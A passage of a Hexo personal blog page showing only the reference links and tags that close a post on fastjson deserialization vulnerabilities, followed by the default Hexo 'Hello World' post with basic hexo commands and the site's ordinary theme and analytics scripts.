<h3 id="6、参考链接："><a href="#6、参考链接：" class="headerlink" title="6、参考链接："></a>6、参考链接：</h3><p><a target="_blank" rel="noopener" href="http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/</a><br><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/">https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14776043.html#%E5%88%A9%E7%94%A8%E9%99%90%E5%88%B6">https://www.cnblogs.com/nice0e3/p/14776043.html#%E5%88%A9%E7%94%A8%E9%99%90%E5%88%B6</a></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fastjson/" rel="tag">fastjson</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>

    </footer>
  </div>

   
    
</article>

    
    <article
  id="post-hello-world"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/02/20/hello-world/"
    >Hello World</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/02/20/hello-world/" class="article-date">
  <time datetime="2022-02-20T07:43:19.258Z" itemprop="datePublished">2022-02-20</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
    
</article>

    
  </article>
  

  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2022
        <i class="ri-heart-fill heart_icon"></i> CrossTime
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/crosstime.png" alt="CrossTime的个人博客"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->
 
<script src="/js/clickLove.js"></script>
 
<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->

<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>